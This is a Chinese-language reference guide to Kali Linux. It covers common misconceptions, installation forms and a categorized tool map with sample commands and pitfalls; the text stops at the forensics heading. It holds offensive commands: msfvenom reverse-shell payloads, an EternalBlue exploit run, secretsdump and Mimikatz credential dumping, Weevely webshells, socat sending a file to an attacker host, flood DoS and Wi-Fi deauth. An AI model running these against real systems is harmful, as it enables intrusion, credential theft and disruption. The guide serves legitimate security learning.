01 / WHAT IT IS先拆掉四个误会

Kali 的定位被营销图和短视频带偏了很久。它本质上就是 Debian 加一批预装软件、一套驱动补丁和几个元包， 没有任何"渗透魔法"。四个最常见的误会，会直接决定你用它的方式对不对。

「装了 Kali 就会渗透」

工具解决的是"执行"，不解决"判断"。同一台机器，会的人看到 8080 端口会去查 Tomcat 的默认口令和 Manager 应用； 不会的人只会把 nmap 的输出截图发到群里。Kali 让执行成本接近零，判断成本一点没降。

「Kali 自带匿名」

默认情况下你的出口 IP 就是自己家的宽带 IP。Tor、VPN、代理链都要自己配，而且它们只改网络层， 不改浏览器指纹、不改时区、不改日志。匿名的核心是操作纪律，不是一个发行版的名字。

「Kali 可以当日常系统」

技术上可以，实践上不建议：滚动更新偶尔把驱动或桌面搞挂；几百个工具抢同一批依赖； 它默认不做面向日常使用的加固。日常用 Debian/Ubuntu，把 Kali 放虚拟机里，是更省心的组合。

「Kali 只给攻击者用」

取证、日志分析、应急响应、合规检查用的也是同一批工具（Sleuth Kit、Volatility、Zeek、Suricata）。 官方还单独出了偏防守的 Kali Purple。攻击和防守在工具层面高度重合，区别在授权和目标。

它自带的东西，分三层看

层内容你实际会用到多少
系统层Debian testing 血统的 kali-rolling、XFCE 桌面、NetworkManager、Metasploit 用的 PostgreSQL、自带补丁的内核（注入类无线网卡驱动支持更好）天天用，但要自己配时区、输入法、快照

02 / WHICH BUILD先选形态，再谈工具

同一套工具，装在不同形态里能做的事差别很大。选错的典型症状：在 WSL 里折腾无线网卡、在虚拟机里跑 GPU 破解、 在实体机上滚更新滚到没网。

形态适合代价 / 限制
虚拟机镜像
VMware / VirtualBox / Hyper-V		入门首选。快照一秒回滚，环境隔离，宿主机照常办公无 GPU 直通时 hashcat 很慢；无线网卡只能 USB 直通且型号挑剔；桥接网络要手动配
Installer ISO
实体机 / 双系统		需要真实硬件：无线注入、蓝牙、RFID、SDR、性能敏感任务分区有风险，装前备份；滚动更新可能影响日常使用；建议单独一块盘
Live USB临时借用机器、应急排查、不想留痕的演示默认不持久化（要手动加 persistence 分区）；U 盘速度拖慢体验
WSL2Windows 上快速用 CLI 工具：nmap、sqlmap、ffuf、impacket没有 GUI 工具（Burp/Wireshark 需另配 WSLg）；无无线；raw socket 行为受限，扫描结果可能和真机不同
ARM 镜像树莓派、随身设备、低功耗跳板部分工具无 ARM 包；性能有限；散热
Kali NetHunter安卓手机做 HID 键盘注入、外接网卡无线测试需要 root 与定制内核，机型支持有限；日常手机不建议
Docker 镜像CI 里跑扫描、批量任务、把工具固定成版本要自己处理网络与权限（--net host、--privileged），不适合当交互式工作站
Kali Purple蓝队 / SOC 实验：Suricata、Zeek、Arkime、Wazuh、TheHive 等一套防守栈占用资源大；组件随版本调整，装完先看官方文档；不是"防守版 Metasploit"

给第一次装的人一条最短路径

  1. 下载 VirtualBox / VMware 预构建镜像（kali.org/get-kali 的 Virtual Machines 页），导入即用。
  2. 登录：用户名 kali、密码 kali（仅预构建镜像如此；安装版是你自己设的）。
  3. 第一件事：sudo apt update && sudo apt full-upgrade -y，然后做快照，命名"干净基线"。
  4. 网络先用 NAT，需要被局域网访问时再加一块 Host-only / 桥接网卡。
  5. 拍完快照再折腾驱动和工具，坏了直接回滚，别硬修。

03 / TOOL MAP十四类，一百多个工具，按用途查

下面按 Kali 官方工具分类（kali-tools-* 元包）排列，每张卡给一句话定位、一条典型命令、一个最常踩的坑。 命令里的 IP、域名、哈希都是占位符。搜索框可以直接搜"无线""提权""哈希""取证"这类中文。

正在载入清单…

nmap

信息收集

端口与服务识别的事实标准。脚本引擎（NSE）让它从"扫端口"扩展到漏洞探测、服务枚举、认证爆破。

sudo nmap -sS -sV -O -p- -T4 --min-rate 1000 10.10.10.5

坑：-sS 要 root；-p- 扫全端口对内网设备很慢，先跑 --top-ports 1000。结果一定存盘：-oA scan/10.10.10.5。

masscan

信息收集

异步发包，扫描整个网段只花几分钟。适合先圈出"哪些 IP 活着、开了哪些端口"，再交给 nmap 细看。

sudo masscan -p1-65535 10.10.10.0/24 --rate=1000 -oL mass.txt

坑：速率调高会把小路由器打趴下，也会被 IDS 一眼看到。先用 --rate=100 试。

whois / dig

信息收集

域名注册信息与 DNS 记录。资产梳理的第一步：注册人、NS、MX、TXT 里经常藏着内部系统名。

whois example.com
dig +short MX example.com
dig axfr @ns1.example.com example.com

坑：AXFR 区域传送绝大多数域名已禁止；被拒绝是常态，不是命令写错。

dnsrecon

信息收集

DNS 枚举一体化：A/NS/MX/SRV 记录、区域传送、子域名爆破、反向解析、缓存嗅探。

dnsrecon -d example.com -t std
dnsrecon -d example.com -t brt -D subdomains.txt

坑：爆破模板在 /usr/share/dnsrecon/，默认字典很小，效果取决于你给的字典。

dnsenum

信息收集

老牌 DNS 枚举脚本，会把 Google 抓取、区域传送、子域爆破、WHOIS 网段查询串成一个流程。

dnsenum example.com

坑：内置 Google 抓取接口早已失效，输出里那一段空的是正常的，别当成"没有子域"。

fierce

信息收集

轻量级 DNS 侦察，先找 NS 再尝试区域传送，最后做子域暴力枚举，输出比较干净。

fierce --domain example.com

坑：对 CDN 后面的域名几乎无效，解析出来全是一个 IP。

theHarvester

信息收集

从公开搜索引擎和证书透明度日志里捞邮箱、子域、主机名、员工名，用于社会工程前的信息面测绘。

theHarvester -d example.com -b duckduckgo,bing,crtsh -l 300

坑：不同 -b 源需要不同 API key，没配就直接跳过；结果噪声大，要人工去重。

recon-ng

信息收集

模块化的侦察框架，用"工作区 + 模块 + 数据库"管理整个 OSINT 流程，结果可以导出成表。

recon-ng
> marketplace search
> workspaces create acme
> modules load recon/domains-hosts/hackertarget
> run

坑：模块市场里的接口大多要 key；先把 keys add 配好，否则一堆模块跑不出东西。

amass

信息收集

OWASP 出品，做子域枚举和资产图谱，被动源和主动爆破都支持，适合较大范围的资产盘点。

amass enum -passive -d example.com -o subs.txt

坑：主动模式很吵、很吃资源；先 passive，再对候选子域用 httpx 验证存活。

netdiscover

信息收集

ARP 层面的主机发现，不依赖 ICMP，能找出关了 ping 的设备。进内网后第一件事常是它。

sudo netdiscover -r 192.168.56.0/24

坑：只能发现同一二层网段的设备，跨网段无效；虚拟机 NAT 模式下看到的是虚拟网段。

arp-scan

信息收集

比 netdiscover 更快更干净的 ARP 扫描器，能顺带识别网卡厂商（OUI），快速判断设备类型。

sudo arp-scan -l --interface=eth0

坑：需要和目标准备在同一广播域；容器/虚拟网桥里常拿到错误的 MAC。

enum4linux / enum4linux-ng

信息收集

把 SMB/RPC 的一堆手工查询打包成一个命令：用户、组、共享、密码策略、操作系统信息全试一遍。

enum4linux-ng -A 10.10.10.5

坑：扫描噪声大、连接数多，容易被锁定或封 IP；先用 -u '' -p '' 试匿名。

smbmap / smbclient

信息收集

枚举 SMB 共享、权限和可写目录。拿到凭据后，这是横向移动最常用的入口之一。

smbmap -H 10.10.10.5 -u user -p 'pass'
smbclient -L //10.10.10.5 -N

坑：能列共享不等于能读文件；smbmap -R 递归列目录会非常慢。

snmpwalk

信息收集

SNMP 默认团体名（public/private）经常没改，一次 walk 能拿到接口表、路由、进程、安装软件甚至用户名。

snmpwalk -v2c -c public 10.10.10.5

坑：UDP 161 不通时先确认不是防火墙丢包；输出可达数千行，务必重定向到文件再 grep。

Burp Suite

Web 应用

Web 测试的主工作台：代理拦包、Repeater 重放、Intruder 爆破、Scanner（Pro）自动扫。Kali 预装社区版。

burpsuite &
# 浏览器代理指向 127.0.0.1:8080，访问 http://burp 下载 CA 证书

坑：不装 CA 证书就看不到 HTTPS 明文；社区版 Intruder 限速，暴力破解很慢。

OWASP ZAP

Web 应用

开源替代 Burp 的完整方案，自动扫描和被动扫描都强，命令行/CI 集成比 Burp 免费版友好。

zaproxy &
zap.sh -cmd -quickurl http://10.10.10.5 -quickout report.html

坑：自动扫描前先手工走一遍站点，否则爬虫抓不到需要登录的页面。

nikto

Web 应用

老牌 Web 服务器扫描器，检查危险文件、默认页面、过时组件、错误配置，速度很快。

nikto -h https://10.10.10.5 -ssl -o nikto.txt

坑：误报率高，看到"可能存在"要手工验证；对现代 SPA 基本无效。

sqlmap

Web 应用

SQL 注入检测与利用的完整链条：判注入点、取库表、拖数据、读文件、拿 shell，支持几乎所有数据库。

sqlmap -u "http://10.10.10.5/item.php?id=1" --batch --dbs
sqlmap -r req.txt -p id --level=3 --risk=2 --dump

坑：--os-shell、--dump-all 是破坏性/高噪声操作，只在授权范围且明确允许时用。

gobuster

Web 应用

用字典爆破目录、文件、DNS 子域、vhost、S3 桶。Go 写的，速度比 dirb 快一个量级。

gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,bak

坑：遇到 403 也有价值（目录存在），要加 -b 404 而不是只留 200；注意 WAF 会封 IP。

ffuf

Web 应用

通用 fuzzer：目录、参数、用户名、Host 头都能 FUZZ。响应过滤（-fs/-mc）比 gobuster 灵活。

ffuf -u http://10.10.10.5/FUZZ -w common.txt -mc 200,301,403 -fs 0
ffuf -u "http://10.10.10.5/?id=FUZZ" -w ids.txt -mr "error"

坑：默认并发 40，遇到软 404 必须先 -fs 按响应大小过滤，否则满屏假阳性。

dirb / dirbuster

Web 应用

经典目录扫描组合（dirbuster 是 GUI）。字典在 /usr/share/dirb/wordlists/，适合教学和快速验证。

dirb http://10.10.10.5 /usr/share/wordlists/dirb/common.txt

坑：慢，而且不识别 SPA 路由。现代目标优先用 ffuf/gobuster。

WPScan

Web 应用

WordPress 专用扫描器：版本、插件/主题漏洞、弱口令、用户枚举，漏洞库需要 API token 才完整。

wpscan --url http://blog.example.com --enumerate vp,u --api-token XXX

坑：没 token 只能看基础信息；--enumerate vp 很慢且会被 --stealthy 限流。

WhatWeb

Web 应用

指纹识别：CMS、框架、服务器版本、JS 库、分析工具，一次跑出目标用的是哪套技术栈。

whatweb -a 3 https://example.com --log-json=whatweb.json

坑：-a 3 主动性最高，也最容易被 WAF 拦；先用 -a 1 默默看一眼。

wafw00f

Web 应用

识别目标前面是 Cloudflare、Akamai、ModSecurity 还是没装 WAF，决定后面用多激进的打法。

wafw00f https://example.com -a

坑：识别失败不代表没有 WAF，只代表它的特征没匹配上。

Nuclei

Web 应用

基于 YAML 模板的漏洞扫描器，社区模板上万条，CVE 曝光后几小时内就有检测模板。

nuclei -update-templates
nuclei -u https://example.com -tags cve,rce -severity high,critical

坑：模板不更新等于白跑；默认并发会打崩小站点，加 -rl 50 限速。

Commix

Web 应用

命令注入自动化：探测注入点、猜分隔符、拿回显、反弹 shell，对 GET/POST/Cookie 都支持。

commix --url="http://10.10.10.5/ping.php?ip=127.0.0.1" --batch

坑：盲注场景要配 --os-cmd 和延时参数，不然一直报"未找到注入点"。

XSStrike / xsser

Web 应用

XSS 检测与 payload 生成，带上下文分析和 WAF 绕过尝试。

xsser --url="http://10.10.10.5/search?q=XSS"

坑：反射型 XSS 现在价值有限，别把扫描器报的"可能存在"直接写进报告当确认漏洞。

BeEF

Web 应用

浏览器利用框架：XSS 之后挂 hook，能做的事变成"控制一个浏览器"——截图、跳转、键盘记录、内网探测。

sudo beef-xss
# 面板 http://127.0.0.1:3000/ui/panel

坑：默认口令必须改；hook 脚本走 HTTP，混合内容页面里会被浏览器拦掉。

mitmproxy

Web 应用

命令行/可编程的中间人代理，适合批量改包、写脚本处理流量、把请求导出给自动化流程。

mitmproxy -p 8080
mitmdump -w flows.mitm --set console_eventlog_verbosity=info

坑：证书要装到目标设备信任链，Android 7+ 需要改 APK 的 networkSecurityConfig 才行。

httpx

Web 应用

把一堆主机名变成"哪些还活着、跑的什么技术、标题是什么、状态码多少"，资产验证的标准工具。

cat subs.txt | httpx -status-code -title -tech-detect -o live.txt

坑：默认只探 HTTP/HTTPS 常用端口，非标端口要显式加 -ports。

searchsploit

漏洞分析

本地 Exploit-DB 的离线查询，不联网也能按产品、版本、CVE 找到公开 PoC，直接拷到工作目录。

searchsploit apache 2.4.49
searchsploit -m 50383
searchsploit -u   # 更新本地库

坑：公开 PoC 大多不能直接跑，改之前先读懂；老脚本依赖的库早已不兼容。

Greenbone / GVM（原 OpenVAS）

漏洞分析

完整的漏洞扫描平台：上万条 NVTs 检测项、Web 管理界面、可导出专业报告，适合做基线扫描。

sudo gvm-setup
sudo gvm-start   # 面板 https://127.0.0.1:9392

坑：首次初始化极慢（要同步漏洞库），且吃 4GB+ 内存；扫描会留下大量日志。

Lynis

漏洞分析

主机层面安全审计：内核参数、SSH 配置、文件权限、过期软件、日志策略，给出加固建议和评分。

sudo lynis audit system

坑：它只给"建议"不给"漏洞"，报告里的 warning 要自己判断是否真在威胁模型内。

sslscan / testssl.sh

漏洞分析

TLS 配置体检：协议版本、弱套件、证书链、Heartbleed/POODLE 一类已知问题。

sslscan example.com:443
testssl.sh --severity HIGH https://example.com

坑：CDN 会终止 TLS，扫出来的是 CDN 的配置，不是源站的。

YARA

漏洞分析

用规则匹配恶意软件特征，写规则、扫文件、扫内存镜像都行，防守方和样本分析都在用。

yara -r rules.yar /samples/

坑：规则写得太宽会满屏命中，太窄就漏；-s 看命中字符串才知道为什么匹配。

Nmap NSE 漏洞脚本

漏洞分析

不装扫描平台也能做快速验证：vuln 类脚本覆盖 SMB、SSL、HTTP 的常见已知问题。

sudo nmap -sV --script vuln -p 445,443 10.10.10.5
nmap --script smb-vuln-ms17-010 -p445 10.10.10.5

坑：部分脚本会触发崩溃或蓝屏（如针对特定 SMB 漏洞），生产环境慎用。

Hydra

密码攻击

在线爆破的多协议瑞士军刀：SSH、FTP、RDP、SMB、MySQL、HTTP 表单、IMAP 等五十多种。

hydra -L users.txt -P pass.txt ssh://10.10.10.5 -t 4
hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login:u=^USER^&p=^PASS^:F=incorrect"

坑：线程开大会把服务打挂或被 fail2ban 封；先确认账号是否存在，别把"锁定"当成"密码错"。

Medusa

密码攻击

和 Hydra 同类，模块化设计，并发模型不同，某些协议上比 Hydra 稳（尤其 HTTP 基本认证）。

medusa -h 10.10.10.5 -u admin -P pass.txt -M ssh -t 4

坑：错误提示不友好，认证失败和连接失败要看 -v 6 的调试输出区分。

John the Ripper

密码攻击

离线哈希破解，自动识别哈希类型，规则引擎（wordlist + mangling）比纯字典强得多。

gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt

坑：Kali 里 rockyou 是压缩包，不解压就跑会报"文件不存在"；先 john --list=formats 确认格式。

Hashcat

密码攻击

GPU 加速的哈希破解，支持 300+ 种算法，规则攻击、掩码攻击、组合攻击都比 CPU 工具快几个数量级。

hashcat -m 1000 ntlm.txt rockyou.txt -O
hashcat -m 22000 capture.hc22000 rockyou.txt
hashcat -m 0 md5.txt -a 3 ?a?a?a?a?a?a

坑：虚拟机里没有 GPU 直通时速度只有实机的零头；-m 选错会静默失败，先跑 --example-hashes。

Crunch

密码攻击

按规则生成字典：指定长度、字符集、固定位置、模式，比手写脚本可靠。

crunch 8 8 -t Pass@@@@ -o list.txt
crunch 6 8 abc123 -o list.txt

坑：生成量按指数涨，?a?a?a?a?a?a 就是几百 GB；先算体积再落盘。

CeWL

密码攻击

爬目标站点生成定制字典——公司名、产品名、员工名字，往往比通用字典命中率高得多。

cewl -d 2 -m 6 -w words.txt https://example.com

坑：爬太深会被拦；配合 --with-numbers 和 john 的规则一起用效果好。

Pipal

密码攻击

分析已泄露密码库的统计特征：常用词、键盘模式、年份、长度分布，用来优化破解策略。

pipal passwords.txt

坑：处理的是真实凭据，属于敏感数据，别留在共享目录或未加密的磁盘里。

wordlists / SecLists

密码攻击

Kali 自带基础字典；SecLists 收集了目录、参数、用户名、密码、子域等各类字典，是实际测试的默认来源。

sudo apt install seclists
ls /usr/share/seclists/Discovery/Web-Content/
ls /usr/share/wordlists/

坑：字典选错比工具选错更浪费时间：先看目标语言和框架，再挑对应字典。

Metasploit Framework

漏洞利用

最完整的漏洞利用框架：exploit / payload / auxiliary / post 模块齐全，配合数据库管理主机与战果。

sudo msfdb init && msfconsole -q
msf6 > search type:exploit platform:windows smb
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.5
msf6 > set LHOST 10.10.14.2
msf6 > run

坑：LHOST 填错是最常见的失败原因；先 ip a 确认回连网卡，再检查防火墙。

msfvenom

漏洞利用

生成各种格式的 payload：exe、elf、apk、php、war、宏文档，可编码、可绑定端口、可分段。

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4443 -f exe -o up.exe

坑：现代杀软基本都认识裸 payload；-e 编码器早已不能免杀，别信老教程。

pwntools

漏洞利用

写 exploit 的 Python 框架：打包/解包、ROP 构造、远程连接、gdb 调试一条龙，CTF 和真实二进制漏洞都用它。

python3 -c "from pwn import *; context.log_level='debug'; io=remote('10.10.10.5',1337)"
checksec --file=./vuln

坑：库版本更新快，老脚本的 process()/remote() 调用可能已变，先读当前文档。

searchsploit + 手工验证

漏洞利用

拿到版本号后，最有效的路径往往不是"上框架"，而是找到对应 PoC、读懂、改参数、在隔离环境复现。

searchsploit -w "textpattern 4.8"
searchsploit -m 48931 && vim 48931.py

坑：PoC 里的反弹 IP、路径、认证头基本都是作者的，直接跑必然失败；先逐行读。

Wireshark

嗅探/中间人

图形化协议分析：抓包、过滤、跟踪流、解密 TLS（有密钥时），排查"到底发了什么"最直接的工具。

sudo wireshark &
# 过滤：http.request || dns || tcp.port==445

坑：交换网络里默认只能看到自己的流量，要先做端口镜像或 ARP 欺骗（需授权）。

tcpdump

嗅探/中间人

服务器上唯一能用的抓包工具，无 GUI 依赖；配合 BPF 过滤，抓完拉回本地用 Wireshark 看。

sudo tcpdump -i eth0 -nn -s0 -w cap.pcap 'tcp port 80 or 443'

坑：忘了 -s0 会截断包；长时间抓包要加 -C 100 -W 10 轮转，否则把磁盘写满。

Ettercap

嗅探/中间人

经典中间人工具：ARP 欺骗、DNS 欺骗、注入过滤，带 GUI 和插件（如 SSL 剥离）。

sudo ettercap -G
sudo ettercap -T -q -i eth0 -M arp:remote /10.10.10.5// /10.10.10.1//

坑：ARP 欺骗会打断目标网络，生产环境属于高危行为；做完务必恢复 ARP 表。

Bettercap

嗅探/中间人

Ettercap 的现代替代：交互式命令 + 模块化，ARP/DNS/HTTP 代理、Wi-Fi 与 BLE 都在一个界面里。

sudo bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 10.10.10.5
> arp.spoof on
> net.sniff on

坑：开了 arp.spoof 不开转发会直接断网；先 net.sniff 观察再动手。

Responder

嗅探/中间人

内网最有效的攻击之一：应答 LLMNR/NBT-NS/mDNS 查询，骗取 NetNTLM 哈希，再离线破解或中继。

sudo responder -I eth0 -wrv

坑：一定要先关掉系统自带的同名服务端口冲突；抓到的是 NetNTLMv2，不是明文口令。

arpspoof（dsniff）

嗅探/中间人

最小化的 ARP 欺骗工具，两个方向各跑一条就能做双向中间人，适合配合 Wireshark 教学演示。

sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 10.10.10.5 10.10.10.1
sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.5

坑：不开启 IP 转发，目标会直接断网；结束后要手动恢复，或等 ARP 缓存超时。

macchanger

嗅探/中间人

修改网卡 MAC，绕过基于 MAC 的白名单、或让两个网卡在同一网络中不冲突。

sudo ip link set eth0 down
sudo macchanger -r eth0
sudo ip link set eth0 up

坑：NetworkManager 会改回去；先 nmcli device set eth0 managed no。

hping3

嗅探/中间人

手工构造 TCP/IP 包：探测防火墙规则、做空闲扫描、测试分片处理，也可用于压力测试。

sudo hping3 -S -p 80 -c 3 10.10.10.5
sudo hping3 --flood -S -p 80 10.10.10.5   # 拒绝服务，慎用

坑：--flood 就是 DoS，未授权使用在国内可直接入刑；只在自建靶场里验证。

Impacket

后渗透

Windows 协议栈的 Python 实现，一整套横向工具：psexec、wmiexec、secretsdump、GetNPUsers、ntlmrelayx。

impacket-secretsdump -just-dc corp.local/admin:'Passw0rd'@10.10.10.1
impacket-psexec corp.local/admin:'Passw0rd'@10.10.10.5
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1

坑：secretsdump 会导出域内全部哈希，属于极高敏感操作，只在授权且明确允许的范围内做。

NetExec（nxc）

后渗透

CrackMapExec 的继任者：一条命令批量验证 SMB/WinRM/LDAP/MSSQL 凭据、列共享、执行命令、抓哈希。

nxc smb 10.10.10.0/24 -u user -p pass --shares
nxc winrm 10.10.10.5 -u user -p pass -x whoami

坑：老教程写 crackmapexec，新版本命令是 nxc，两个包可能都在仓库里，apt search 确认。

Evil-WinRM

后渗透

通过 WinRM 拿交互式 shell，支持上传下载、加载 PowerShell 脚本、用哈希登录（Pass-the-Hash）。

evil-winrm -i 10.10.10.5 -u administrator -p 'Passw0rd!'
evil-winrm -i 10.10.10.5 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

坑：WinRM 默认不对外开放，5985/5986 不在扫描结果里就别浪费时间。

BloodHound

后渗透

把 AD 的权限关系画成图，自动找出"从当前账号到域管理员"的最短路径，域渗透规划的核心工具。

sudo neo4j start
bloodhound &
# 采集端：bloodhound-python -u user -p pass -d corp.local -ns 10.10.10.1 -c all

坑：导入数据前 Neo4j 要先改初始密码；采集用 -c all 会产生大量 LDAP 查询，容易被发现。

Chisel

后渗透

单文件隧道工具，把内网端口通过 HTTP 隧道带到攻击机，纯 Go 实现，落地即用。

# 攻击机
chisel server -p 8000 --reverse
# 目标机
./chisel client 10.10.14.2:8000 R:socks

坑：默认不带 TLS，流量特征明显；生产环境常被流量检测规则命中。

proxychains4

后渗透

让任意 TCP 程序走 SOCKS/HTTP 代理，配合 chisel/ssh 隧道即可用 nmap、curl 访问内网。

sudo vim /etc/proxychains4.conf   # 末尾加 socks5 127.0.0.1 1080
proxychains4 -q nmap -sT -Pn -p 80,445 172.16.5.10

坑：只能代理 TCP，ICMP 和 UDP 扫描全废；必须用 -sT，-sS 走不通。

sshuttle

后渗透

把 SSH 变成 VPN，不用在目标装任何东西，一条命令就能访问整个内网网段（含 DNS）。

sshuttle -r user@10.10.10.5 172.16.5.0/24

坑：需要目标有 SSH 且允许转发；本机要 root；和已有 VPN 路由容易冲突。

socat

后渗透

"网络界的瑞士军刀"：端口转发、反弹 shell、文件传输、串口转 TCP，比 nc 功能多且稳定。

socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80
socat file:./payload.sh TCP:10.10.14.2:9001

坑：反向 shell 时记得加 pty,raw,echo=0，否则终端没有交互。

Netcat（nc / ncat）

后渗透

最基础的 TCP/UDP 工具：监听端口接 shell、传文件、做端口探测。Kali 默认的 nc 是 OpenBSD 版。

nc -lvnp 4444
nc -lvnp 4444 > received.bin
nc 10.10.10.5 80

坑：OpenBSD 版没有 -e，反弹 shell 要用 -c 或命名管道。

Mimikatz

后渗透

Windows 凭据提取的事实标准：明文口令、NTLM 哈希、Kerberos 票据、PIN 码，域渗透的必经一步。

# Windows 目标上（需管理员 + 关闭杀软或绕过）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

坑：它不在 Kali 仓库里，是 Windows 二进制；直接把 exe 丢上去基本会被 Defender 删掉。

Kerbrute

后渗透

Kerberos 预认证枚举用户名，不触发登录失败锁定，是域内用户收集最快的方式。

kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt

坑：只能确认"用户存在"，不能验证密码；Kerberos 时间偏差超过 5 分钟就全失败。

Weevely

后渗透

生成并管理 PHP webshell，把上传的 shell 变成类似终端的会话，支持模块化后渗透操作。

weevely generate S3cret shell.php
weevely http://10.10.10.5/uploads/shell.php S3cret

坑：生成的 shell 有明显特征，主流 WAF 和杀软都能识别；只在授权环境使用。

airmon-ng / airmon-zc

无线

把无线网卡切到监听模式（monitor），是后续抓包、注入的前提。新内核用 airmon-ng start wlan0 后检查接口名。

sudo airmon-ng check kill
sudo airmon-ng start wlan0
iw dev

坑：网卡必须支持监听与注入（Atheros AR9271、RTL8812AU 等）；切模式前先杀掉 NetworkManager，否则监听口会被管回去。

airodump-ng

无线

无线网络嗅探：列出周边 AP 的 BSSID、信道、加密方式、客户端，并抓握手包。

sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon

坑：5GHz 要指定信道或分开扫；抓不到握手包通常是没人连接，不是命令错。

aireplay-ng

无线

报文注入：反认证（deauth）踢客户端重连以抓握手包、伪造认证、ARP 重放加速 IV 收集。

sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

坑：deauth 会让目标断网，属于主动干扰；WPA3 和 802.11w（PMF）下基本无效。

aircrack-ng

无线

用字典离线跑 WPA/WPA2 握手包；WEP 场景可直接统计破解。

aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF cap-01.cap

坑：握手包不完整（没有 4 次握手全流程）会一直报"没有有效握手"；先用 aircrack-ng cap.cap 检查。

hcxdumptool

无线

现代 WPA 抓包工具，同时采集 PMKID 和 EAPOL，PMKID 攻击不需要等客户端上线。

sudo hcxdumptool -i wlan0 -o dump.pcapng --enable_status=1

坑：会主动发包，噪声大；接口名要用原始 wlan0 而非 mon 口，版本间参数变化大。

hcxtools（hcxpcapngtool）

无线

把抓到的 pcapng 转成 hashcat 的 22000 格式，是"抓包 → GPU 破解"之间的标准转换器。

hcxpcapngtool -o hash.hc22000 -E essidlist dump.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt

坑：转换后显示 0 条哈希说明没抓到有效握手，别急着怪 hashcat。

Wifite

无线

把扫描、抓包、deauth、破解串成一条自动流水线，适合批量评估周边无线安全状况。

sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt

坑：全自动意味着主动干扰，测试前必须确认授权范围包含无线；WPS 破解成功率取决于路由器。

Kismet

无线

被动无线侦测：AP、客户端、探测请求、蓝牙/BLE 一网打尽，带 Web 界面和日志，适合做无线资产测绘。

sudo kismet -c wlan0

坑：默认会尝试接管网卡；容器里跑要手动映射接口；日志体积增长很快。

Reaver / Bully

无线

针对 WPS 的 PIN 爆破，利用 WPS 设计缺陷拿 WPA 口令，老路由器上仍有命中。

sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

坑：现代固件普遍有锁定期和防爆破；-K 1 用 pixie dust，更快但依赖芯片实现。

mdk4

无线

802.11 压力测试工具：deauth 风暴、信标洪泛、伪造 AP，用于测试无线 IDS 和客户端健壮性。

sudo mdk4 wlan0mon b -f ap_list.txt

坑：这是主动干扰，在多数司法辖区等同破坏通信，只能在自己的屏蔽实验室里用。

Fern WiFi Cracker

无线

图形化无线测试工具，点几下就能完成 WEP/WPA/WPS 流程，适合入门理解整体步骤。

sudo fern-wifi-cracker

坑：依赖旧版 Qt/Python 组件，新版 Kali 上可能起不来；真做测试还是用 aircrack-ng 组合。

Proxmark3

硬件/射频

RFID/NFC 研究的通用硬件：读卡、嗅探、模拟、克隆低频与高频卡，配合官方客户端 pm3 使用。

pm3
> hw version
> lf search
> hf search

坑：固件与客户端版本必须匹配，否则命令全报错；不同批次硬件"变砖"风险要提前了解。

mfoc / mfcuk

硬件/射频

MIFARE Classic 卡的密钥恢复：mfoc 用已知密钥推导全卡，mfcuk 走 darkside 攻击找未知密钥。

mfoc -O card.mfd
mfcuk -C -R 0:A -s 250 -v 3

坑：需要 PN532 等兼容读卡器；新版卡片（MIFARE Plus / DESFire）不适用这套攻击。

libnfc 工具集

硬件/射频

nfc-list / nfc-mfclassic 等命令行小工具，做卡片识别、数据转储、UID 模拟的基础。

nfc-list
nfc-mfclassic r a card.mfd

坑：同一读卡器同时只能被一个进程占用，先确认没有别的服务在抢。

bluetoothctl / bettercap BLE

硬件/射频

蓝牙设备发现与配对调试；配合 bettercap 的 BLE 模块可观察广播、做 GATT 枚举。

bluetoothctl
> scan on
> devices
> info AA:BB:CC:DD:EE:FF

坑：虚拟机里没有蓝牙直通就看不到任何设备；BLE 地址默认随机化，扫描靠名称识别。

Ubertooth

硬件/射频

开源蓝牙嗅探硬件，能抓蓝牙经典与 BLE 的链路层数据，用于分析配对与广播过程。

ubertooth-scan
ubertooth-btle -f -c capture.pcap

坑：加密链路抓下来仍是密文；跳频跟踪需要目标在活动状态。

RTL-SDR

硬件/射频

几十块钱的软件无线电接收棒：听调频、看频谱、解 pager、看飞机 ADS-B，射频入门的最低门槛。

rtl_test -t
rtl_fm -f 100.7M -M wbfm -s 200k -r 48k - | play -t raw -r 48k -e signed -b 16 -c 1 -

坑：只能收不能发；采样率越高越容易丢包，USB 供电不足时先接带电源的 HUB。

HackRF One

硬件/射频

半双工收发 SDR，1MHz–6GHz，能录制回放、做简单的信号注入，价格在发射能力里最低。

hackrf_info
hackrf_transfer -r capture.iq -f 433920000 -s 2000000

坑：发射需要合法频段与功率，干扰航空/应急频段后果严重；先学法规再按 PTT。

GNU Radio

硬件/射频

图形化 DSP 流程图工具，把"信号 → 解调 → 解码"搭出来，是理解无线协议最有效的办法。

gnuradio-companion

坑：吃 CPU；实时流用 osmocom 源时缓冲区太小会溢出丢样本。

Universal Radio Hacker

硬件/射频

UHR：抓未知无线信号、自动识别调制方式、把比特流变成可编辑的协议，再回放/伪造。

urh

坑：解码前要先确认采样率和频率对准，否则看到的全是噪声。

Spooftooph

硬件/射频

蓝牙设备名与地址的快速伪装，用来测试设备识别逻辑或做演示。

spooftooph -i hci0 -n "iPhone" -a 00:11:22:33:44:55

坑：只能改本地适配器信息，不能伪装成远端设备；新版 BlueZ 权限收紧，常需要 root。

Autopsy

取证

